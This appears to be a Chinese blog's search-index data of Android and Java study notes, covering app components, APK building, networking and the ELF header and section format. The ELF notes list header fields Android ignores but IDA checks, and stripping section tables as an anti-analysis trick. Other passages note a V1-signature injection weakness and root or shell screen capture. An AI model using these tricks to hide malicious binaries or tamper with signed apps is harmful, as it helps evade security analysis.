","date":"2021-10-21","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/:7:4","tags":["Android"],"title":"NDK开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/ndk%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Java ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:0","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"开发环境 环境配置: JDK下载 https://www.oracle.com/java/technologies/downloads/ 环境变量 JAVA_HOME //这里写jdk的安装路径 //如:C:\\Program Files\\Java\\jdk1.8.0_151 Path: %JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin; CLASSPATH: .;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar; 编译运行Java程序: 代码示例: //包名 //开头-项目名称-功能 //公司用com, 个人用org, 官方用java开头 //包里面的以点分割的字段, 分别对应一个文件夹名 package org.hello.main; import org.hello.math.Math; public class Hello { public static void main(String[] args) { System.out.println(\"1 + 2 = \" + Math.add(1, 2)); } } package org.hello.math; public class Math { public static int add(int n1, int n2) { return n1 + n2; } } 注意 文件名和类名一致 一个类对应一个文件 包里面的以点分割的字段,分别对应一个文件夹名 编译运行: 应用的示例代码为上面的 文件夹结构 编译 javac -cp C:\\Users\\XiaLuoHun\\Desktop\\LuoJavaTest Hello.java 运行 java org.hello.main.Hello Java编译运行.rar Eclipse导出Java工程: 运行Java的可执行Jar文件: ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:1","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"数据类型 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:2","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"关键字 final: //类似于C++中的const final int n = 1; 运算符: int n = 1; n \u003e\u003e= 1;//Java中都是有符号数的, 右移补符号位 n \u003e\u003e\u003e= 1;//高位补0 abstract, extends: public abstract class IShape{ //抽象方法 abstract public void fun1(); //非抽象方法 public void fun2(){ } } //Java无多重继承 public class LuoLine extends IShape{ @Override public void fun1() { } } interface, implements: //接口类1 public interface Interface1 { public void fun1(); } //接口类2 public interface Interface2 { public void fun2(); } //多重继承也是有需求的,如:两个基类都是接口类的情况下 public class LuoTest implements Interface1, Interface2{ @Override public void fun1() { } @Override public void fun2() { } } ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:3","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"包装类 模板: public class LuoList\u003cT\u003e{ public void push_back(T e){ } } //Java中的模板是假的模板,没有编译预处理的说法,即不存在替换代码 //上述代码编译后为下面的代码 public class LuoList{ public void push_back(Object e){ } } //Java中的泛型编程,只能传对象进去,且这个对象是Object的派生类 //我们通常写的一个类,编译器默认添加extend Object, 即默认是Object的派生类 //Java为每个基本类型都生成了一个类对象 //int -\u003e Integer, double -\u003e Double, float -\u003e Float, short -\u003e Short LuoList\u003cInteger\u003e LuoAry = new LuoList\u003cInteger\u003e(); LuoAry.push_back(1);//等价于LuoAry.push_back(new Integer(1)); LuoAry.push_back(2); Java中的基本数据类型没有方法和属性, 而包装类就是为了让这些拥有方法和属性,实现对象化交互. int n = Integer.parseInt(\"100\"); float f = Float.parseFloat(\"10.88\"); ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:4","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"流程控制语句 跳出多重循环: //Java中没有goto, 但可以使用break Label //下面语句的意思是,当j == 3时, 跳出下面的两层循环, 打印Hello Java Label1: for (int i = 0; i \u003c 3; i++){ for (int j = 1; j \u003c 4; j++){ System.out.println(i * j); if ( j == 3){ break Label1; } } } System.out.println(\"Hello Java\"); ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:5","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"内部类 public class Hello{ private int m_nData1 = 1; //当内部类不是静态的时候, 他有两个this指针 public class LuoHello { private int m_nData2 = 100; public void Luofun() { //因为有两个this指针, 这里可以访问m_nData1成员 m_nData1 = 10; System.out.println(\"LuoHello m_nData1 = \" + m_nData1 + \" m_nData2 = \" + m_nData2); } } private void fun(){ System.out.println(\"Hello m_nData1 = \" + m_nData1); //new LuoHello这个内部类的时候, 偷偷将Hello的this指针传了进去 LuoHello Luo = new LuoHello(); Luo.Luofun(); } public static void main(String[] args) { Hello Hun = new Hello(); Hun.fun(); } } ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:6","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"集合类的使用 List Set Map ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:7","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"库的使用 百度搜索 java api, 可看到官方网址: https://docs.oracle.com/javase/8/docs/api/ ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:1:8","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Android ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:0","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"概述 Android网站 体系架构 最底层,Linux内核. HAL层,硬件抽象层,为了不修改Linux代码,因为一旦修改了,就必须开源,Linux开源协议是gpl协议. Lib库层,C语言写的,类似于Windows的API. ART虚拟机,Dalvik虚拟机已经淘汰了,从Android5.0开始使用ART虚拟机. Java Api框架,Java代码写的,让程序员可以用Java调用C. 应用层,提供各种各样的控件,直接调用. Jvm 编译方式:.java文件-\u003e.class文件-\u003e.jar文件 架构:基于堆栈 Dvm 编译方式:.java文件-\u003e.class文件-\u003e.dex文件 .dex文件:压缩版的.jar文件,将所有的.class文件合并为一个.dex文件,减少冗余 如:两个class文件中有相同的字符串,这样合并为.dex文件时 相同的字符串只保留了一份. 架构:基于寄存器 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:1","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"AndroidStudio Android开发者网站 安装SDK 安装虚拟机 开启虚拟机开发者模式 在设置中,一直点击版本号. 在开发者模式中,开启USB调试. 快捷键 重命名: Shift + F6 注释: Ctrl + Shift + / 代码格式化: Ctrl + Alt + L 所选代码封装为方法: Ctrl + Alt + M 后退: Ctrl + Alt + 向左箭头 前进: Ctrl + Alt + 向右箭头 快速代码生成: Alt + Insert 方法参数提示: Ctrl + P 查看类方法: Ctrl + F12 类结构窗口: Alt + 7 类继承图: Ctrl + H ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:2","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"APK的生成 APK结构 res目录中的xml文件为二进制格式,称为AXML SDK目录工具 aapt.exe res(编译前的资源)-\u003e aapt.exe(aapt2.exe) -\u003e resources.arsc + res(AXML) + AndroidManifest.xml. 可将编译前的资源文件转换成APK文件中的资源文件,也可将APK文件中的资源文件转换成编译前的资源文件. javac.exe .java文件-\u003ejavac.exe-\u003e.class文件 dx.bat(d8.bat) 将编译前的*.class文件-\u003edx.bat(d8.bat)-\u003e.dex文件 (老版是用dx.bat, 新版是用d8.bat) zip压缩算法打包 res(AXML) + AndroidManifest.xml + .dex + resources.arsc -\u003e .apk zipalign.exe 此工具,与dx.bat同目录. 上述生成的.apk文件,需经此工具进行对齐(AndroidStudio生成的apk文件自动对齐),目的是要确保所有未压缩数据的开头均相对于文件开头部分执行特定的对齐. apksigner.bat(数字签名 RSA) 此工具,与dx.bat同目录. 对上述apk文件,进行数字签名,系统才会安装此apk. 签名在apk文件解压缩后的META-INF文件夹中. apk签名 V1签名机制只校验了现有的文件,没有校验整个apk文件,这就导致了,可以通过向apk中添加文件达到劫持注入的目的. 签名后的文件,在工程根目录中的app目录下的release目录下. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:3","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"本地化应用 中文系统,界面就显示中文;英文系统,界面就显示英文. 向strings.xml添加字符串 修改activity_main.xml中的字符串引用为strings.xml中的 复制values文件,添加后缀zh 修改values-zh中的strings.xml中的内容为中文 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:4","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Activity 提供窗口供应用在其中绘制界面,此窗口通常会填满屏幕,但也可能比屏幕小,并浮动在其他窗口上面. 新建一个Activity 新建一个类 在AndroidManifest.xml文件中说明 快速创建Activity 启动新界面 生命周期 在Avtivity中重写上述虚函数: 进程和应用生命周期 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:5","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"布局 AS新建布局 设置布局 绝对布局 指明子组件的绝对位置,对于不同尺寸的手机来说,适配性较差. \u003c!-- 与父窗口同宽 --\u003e android:layout_width=\"match_parent\" \u003c!-- 与文本同高 --\u003e android:layout_height=\"wrap_content\" 线性布局 用于使所有子视图在单个方向(垂直或水平)保持对齐. \u003c!-- 指定布局方向(垂直或者水平) --\u003e android:orientation=\"horizontal\" \u003c!-- 权重,上图中两控件宽度为0,一个权重为1,一个权重为3, 表示将父窗口宽度划分为4份,一个占1份,一个占3份 --\u003e android:layout_weight 相对布局 不能设置权重,目前AS支持很差,已被约束布局取代. 帧布局 一个控件可以覆盖在另一个控件上. 应用场景:切换界面. 表格布局 用的很少,可以用线性布局来做. 约束布局 主流布局,在相对布局的基础上加上权重. 查看别人的布局 要确保AS和模拟器连接上,方可在下方选择进程,查看布局. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:6","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"控件相关 华丽界面示例 创建一个xml文件. 写下按钮被按下和未被按下所应用的图片. 修改button的背景. button修改完成. 模拟Android系统操作xml文件 TextView EditText Button 按钮消息响应: 自定义一个事件监听类. 按钮注册监听. CheckBox RadioButton 列表组件 数据适配器 上图展示了数据源、适配器、列表控件之间的关系. 我们知道,数据源是各种各样的,而ListView所展示数据的格式则是有一定的要求的. 数据适配器正是建立了数据源与ListView之间的适配. 常用适配器 ArrayAdapter: 只能操作一个控件,如下述中在操作了TextView控件后,不能修改图片控件. 新建一个布局文件, 记录每行的UI. 设置. SimpleAdapter: 新建一个布局文件. 设置 自定义适配器 不用考虑通用性. 示例: 新建一个布局文件. 写一个类,继承BaseAdapter. 调用: 源代码 控件相关.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:7","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"菜单 选项菜单 新建一个menu文件夹. 新建一个menu Xml文件. 重写onCreateOptionsMenu函数,产生菜单. 重写onOptionsItemSelected函数,处理菜单消息. 上下文菜单 存放菜单相关信息,同上. 注册菜单(示例给ListView注册菜单). 重写onCreateContextMenu函数,产生菜单. 重写onContextItemSelected函数,处理菜单消息. 源代码 事件处理模型.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:8","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"提示信息 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:9","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"消息对话框 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:10","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"事件处理模型 基于多态机制 使用场景: 触摸,按键. 示例: 重写虚函数. 基于监听接口 使用场景: 按钮. 监听过程: 事件接口: 示例: 外部类(基本不用): 新建一个类实现监听接口. 给按钮注册监听器. 内部类(常用): 当按钮较多时,直接由Activity实现监听接口: 匿名类(常用): 跟内部类没有区别, 匿名类会由编译器自动生成为内部类, 生成的类名通常为外部类名$1 外部类名$2… 基于系统设置 Configuration类专门用于描述手机设备上的配置信息. 基于消息循环 Android中只有主线程可操作UI,其他线程操作UI会崩,考虑同步的话会降低效率. 自己创建消息循环: 在Android开发者网站搜索Looper类. 源代码 事件处理模型.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:11","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Intent(意图) 3个信息 行为, 指定要执行的通用操作(例如,查看或选取)的字符串. 数据. 类别,一个包含应处理Intent组件类型的附加信息的字符串. 注册意图 Activity中的意图不能只给行为,也要给类别. 显示Intent 如打车,明确告诉从哪条路走,无跨进程概念. 用Intent来传输数据: 这里启动另一个Activity,将用户名和密码传过去(即便跨进程,也可以将数据传过去),然后另一个Activity将真正的密码传回来,最后取回传回来的数据并显示. 启动一个Activity并传数据. 另一个Activity接收数据. 接收Activity销毁后传回来的数据. 隐式Intent 如点外卖,不用关心外卖是如何送到的,可跨进程. 在Manifest说明权限. 请求权限. 获取请求权限结果. 启动别人的Activity: 以自己写的为例. 设置闹铃. 打电话. 源代码 Intent(意图).rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:12","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"服务 是一种可在后台执行长时间运行操作而不提供界面的应用组件. 创建服务 创建一个类,继承Service. 注册服务. 启动与停止服务. 本进程和服务进行通讯 创建一个内部类,继承Binder. 在onBind函数中,返回Binder对象. 创建一个ServiceConnection对象. 绑定服务. 注意 服务默认运行在主线程中. 跨进程操作服务 在高版本的Android系统中,自建服务的跨进程操作,只能在创建服务的子进程中进行操作,只有系统服务,所有进程可操作. 将服务放在创建服务的子进程中 跨进程启动和停止服务 跨进程通讯 AIDL: 利用内核,进行进程间的通讯. 使用AIDL创建绑定服务: 创建.aidl文件. 在.aidl文件中声明接口. 此时编译整个工程,会发现编译器帮我们创建了一个ICount的接口. 实现声明的接口. 在另一个进程中,重写服务连接函数. 若两个工程,需要把aidl文件拷贝过去. 绑定服务,解绑服务,与服务进行通讯. 前台服务 UI放在通知栏. 在Manifest文件声明权限. 创建渠道ID. 创建前台服务. 源代码 服务1.rar 服务2.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:13","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"广播 广播是一种状态的通知,例如我想知道手机网络状态变化,此时我只要注册一个网络状态变化的广播,当系统网络状态发生变化的时候,系统就会发广播,我就可以收到. 广播电台 有序广播 接收广播的时候按优先级,优先级高的先接收到广播,可选择是否中断广播,让后面优先级低的接收不到广播. 无序广播 接收广播的时候无优先级,谁注册了都可以接收到此广播. 本地广播 效率高,不需要跨应用发送广播,可选本地广播. 广播接收者 创建一个类继承BroadcastReceiver 注册广播 静态注册: 在Manifest文件中进行说明,高版本目前不允许(即便静态注册了,也不会收到广播), 当然也有例外. 为了兼容老版本,在高版本中静态注册会变成动态注册,但必须软件运行起来方可接收到广播. 动态注册: 发送带权限的广播 接收系统广播示例 系统常见广播: 以接收系统短信广播为例: Manifest文件中说明权限. 新建一个类继承BroadcastReceiver. 注册短信广播. 需要应用有接收短信的权限,方可接收到短信广播. 源代码 广播.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:14","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"文件 Android中每个应用有自己的私有空间,其他应用不允许访问. 文件存储 配置文件(保存键值对数据) 使用 SharedPreferences API. 创建配置文件并写内容. 创建的文件,在根目录的data/data/包名目录中. 读取配置文件. 自定义文件格式 使用Java中的文件流: 示例: 创建的文件,在根目录的data/data/包名目录中. 共享存储 Android中SD卡内容,所有应用共享. 说明权限. 操作示例. [Android 10.0后创建文件createNewFile()和创建文件夹mkdirs()均失败解决方案.mhtml](Android 10.0后创建文件createNewFile()和创建文件夹mkdirs()均失败解决方案.mhtml) 源代码 文件.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:15","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"数据库 创建数据库和表: 增: 删: 改: 查: 注意 使用Android封装好的SQL操作,可以防止SQL注入. 数据库 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:16","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"内容提供程序 内容提供者 创建一个类继承ContentProvider, 实现增删改查接口. 在Manifest文件中注册内容提供者. 内容提供者 内容接收者 拿上述内容提供者的数据: 增: 删: 改: 查: 内容接收者 拿系统内容提供者的数据: 拿联系人信息: 在Manifest文件中说明. 示例. 拿联系人信息 拿短信信息: 在Manifest文件中说明. 示例. 拿短信信息 内容观察者 向系统注册一个内容观察者,当内容发生了变化,就会收到通知. 在Manifest文件中说明. 写一个类继承ContentObserver,重写onChange函数. 注册内容观察者. 内容观察者 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:17","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"Fragment Activity中放Fragment,Fragment中放布局,可以用来切换视图. 新建一个布局文件. 写一个类继承Fragment,重写onCreateView函数. 静态注册. 动态注册. 源代码 Fragment.rar ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:18","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"功能操作 遍历系统安装的软件 管理器: 示例: 通过包管理器,我们可以知道系统安装的软件. 启动应用 卸载应用 遍历进程 流量查看 低版本用TrafficStats 不准确,高版本用NetworkStatsManager. 监控电话 屏幕截图 Android5.0以后,加入了屏幕采集的API. 示例: 屏幕截图.rar 无视权限,截图: 在Android系统的system/bin目录下有screencap这个程序,这就是用来截图的.只有当uid = shell或者uid = root才可以调screencap来截图. shell权限,就是cmd 执行adb shell. 获取Root权限: 未root的手机,system/bin目录下没有su这个程序,所谓的root就是在system/bin目录下放su这个程序. 模拟键盘 鼠标 触摸等: 在system/bin目录下 有个input程序. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:19","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"网络编程 使用Java的API PC端为Server, Android端为Client. Server: Java中的收发数据跟读写文件一样,一切都是流. 网络编程Server.rar Client: 网络编程Client.rar 注意 Android为Client, PC为Server时, 若通过回环地址连接,Android端需填 10.0.2.2 Android为Server, PC为Client时, 若通过回环地址连接,PC端需要做端口映射. 在Android虚拟机打开的情况下,通过adb命令 adb forward tcp:port tcp:port Android端执行CMD命令 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/:2:20","tags":["Android"],"title":"Android开发","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/android%E5%BC%80%E5%8F%91/"},{"categories":["Android基础"],"content":"ELF是UNIX系统实验室(USL)作为应用程序二进制接口(Application Binary Interface,ABI)而开发和发布的,也是Linux的主要可执行文件格式.全称是Executable and Linking Format,这个名字相当关键,包含了ELF所需要支持的两个功能——执行和链接. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:0:0","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"准备ELF文件 int main(int argc, char* argv[]){ printf(\"Hello ELF!\\n\"); return 0; } AS_PATH := /data/local/tmp ELF_PATH := E:/SoftWareWork/AndroidStudioWork/LuoELF/app/build/intermediates/cmake/debug/obj/armeabi-v7a ELF_NAME := luoelf all: adb push $(ELF_PATH)/$(ELF_NAME) $(AS_PATH) adb shell chmod a+x $(AS_PATH)/$(ELF_NAME) adb shell $(AS_PATH)/$(ELF_NAME) ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:1:0","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"文件格式 ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:0","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"概述 程序头表指向段,等价于PE中的节,用来描述内存映射. 节头表指向节,类似PE的数据目录,指向各种表. 在Obj文件中段是可选的,在可执行文件中节是可选的,但是NDK编译出的ELF文件,段和节都是有的. 总体来说就是一个ELF文件包含3部分,ELF文件头、节、段. 数据类型: ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:1","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"文件头 #define EI_NIDENT 16 typedef struct { unsigned char e_ident[EI_NIDENT]; Elf32_Half e_type; Elf32_Half e_machine; Elf32_Word e_version; Elf32_Addr e_entry; Elf32_Off e_phoff; Elf32_Off e_shoff; Elf32_Word e_flags; Elf32_Half e_ehsize; Elf32_Half e_phentsize; Elf32_Half e_phnum; Elf32_Half e_shentsize; Elf32_Half e_shnum; Elf32_Half e_shstrndx; } Elf32_Ehdr; e_ident: 这16字节是ELF标识,前4字节是文件标志,不可修改. EI_CLASS: 这个字节指明了文件类型. Android系统不检查这个字节,它是通过判断指令集v7a,v8a来确定是32位还是64位. IDA检查了这个字节,如果修改了这个字节,IDA就无法反汇编. EI_DATA: 这个字节决定了接下来ELF文件结构体的解析是按大尾方式还是小尾方式. Android系统不检查这个字节,默认为小尾方式. IDA检查了这个字节,如果修改了这个字节,IDA就无法反汇编. EI_VERSION: ELF文件头的版本. e_type: 这2字节是文件类型. Android5.0之后,可执行文件全部为so文件. Android高版本,这2字节只能是03,不能修改. e_machine: 这2字节是指令集,可在elf-em.h这个头文件中,查看扩展指令集. 这2字节不可修改. e_version: 这4字节指明目标文件的版本. Android系统不检查这4字节. IDA检查了这4字节,不过影响不大,如果修改了,IDA还是可以反汇编. e_entry: 这4字节是程序入口点(OEP),是个RVA. 但如果上面e_type的值是02,这个值就是VA. 如果是共享库文件,这4字节是0. 如果是可执行文件,这4字节不是0. 这是共享库文件和可执行文件很重要的差别. e_phoff: 这4字节是程序头表偏移,如果没有程序头表,该值应为0. e_shoff: 这4字节是节头表偏移,如果没有节头表,该值应为0. 在Android对抗中,删节表是很常见的. e_flags: 这4字节是个标志,没什么用. e_ehsize: 这2字节是ELF文件头大小,以字节为单位. Android系统,不检查这2字节,默认ELF文件头大小为52字节. IDA检查了这2字节,如果我们修改了这2字节内容.IDA只会产生警告,影响不大,仍然可以反汇编. e_phentsize: 这2字节表明程序头表每一个表项的大小,以字节为单位. e_phnum: 这2字节表明程序头表总共有多少表项,如果没有程序头表,该值应设为0. e_shentsize: 这2字节表明节头表每一个表项的大小,以字节为单位. e_shnum: 这2字节表明节头表总共有多少表项,如果没有节头表,该值应设为0. e_shstrndx: 这2字节是节头表中与节名字表相对应表项的索引. ","date":"2021-10-20","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/:2:2","tags":["Android"],"title":"ELF","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/elf/"},{"categories":["Android基础"],"content":"节 typedef struct { Elf32_Word sh_name; //节名字 Elf32_Word sh_type; //节类型 Elf32_Word sh_flags; //节内存属性 Elf32_Addr sh_addr; //内存地址 Elf32_Off sh_offset; //文件偏移 Elf32_Word sh_size; //节大小 Elf32_Word sh_link; //一个索引值,指向节头表中本节所对应的位置 Elf32_Word sh_info; //节的附加信息,根据节的类型不同,本成员的意义也有所不同 Elf32_Word sh_addralign; //对齐值 Elf32_Word sh_entsize; //有一些节的内容是一张表,其中每一个表项的大小是固定的,比如符号表.对于这种表来说,本成员指定其每一个表项的大小 } Elf32_Shdr; sh_name: 4字节,是个偏移值,暂记为P1. 首先通过ELF文件头最后一项e_shstrndx拿到节表中节名称表对应表项的索引, 然后在节表中找到该项,找到sh_offset文件偏移值,暂记为P2 最后将P1 + P2,即可得到该节名字的字符串文件偏移值. sh_type: 4字节,节类型. typedef enum \u003cElf32_Word\u003e { SHT_NULL = 0x0, /* Inactive section header */ SHT_PROGBITS = 0x1, /* Information defined by the program */ SHT_SYMTAB = 0x2, /* Symbol table - not DLL */ SHT_STRTAB = 0x3, /* String table */ SHT_RELA = 0x4, /* Explicit addend relocations, Elf64_Rela */ SHT_HASH = 0x5, /* Symbol hash table */ SHT_DYNAMIC = 0x6, /* Information for dynamic linking */ SHT_NOTE = 0x7, /* A Note section */ SHT_NOBITS = 0x8, /* Like SHT_PROGBITS with no data */ SHT_REL = 0x9, /* Implicit addend relocations, Elf64_Rel */ SHT_SHLIB = 0xA, /* Currently unspecified semantics */ SHT_DYNSYM = 0xD, /* Symbol table for a DLL */ SHT_INIT_ARRAY = 0xE, /* Array of constructors */ SHT_FINI_ARRAY = 0xF, /* Array of deconstructors */ SHT_PREINIT_ARRAY = 0x10, /* Array of pre-constructors */ SHT_GROUP = 0x11, /* Section group */ SHT_SYMTAB_SHNDX = 0x12, /* Extended section indeces */ SHT_NUM = 0x13, /* Number of defined types */ SHT_LOOS = 0x60000000, /* Lowest OS-specific section type */ SHT_GNU_ATTRIBUTES = 0x6ffffff5, /* Object attribuytes */ SHT_GNU_HASH = 0x6ffffff6, /* GNU-style hash table */ SHT_GNU_LIBLIST = 0x6ffffff7, /* Prelink library list */ SHT_CHECKSUM = 0x6ffffff8, /* Checksum for DSO content */ SHT_LOSUNW = 0x6ffffffa, /* Sun-specific low bound */ SHT_SUNW_move = 0x6ffffffa, // Same thing SHT_SUNW_COMDAT = 0x6ffffffb, SHT_SUNW_syminfo = 0x6ffffffc, SHT_GNU_verdef = 0x6ffffffd, /* Version definition section */ 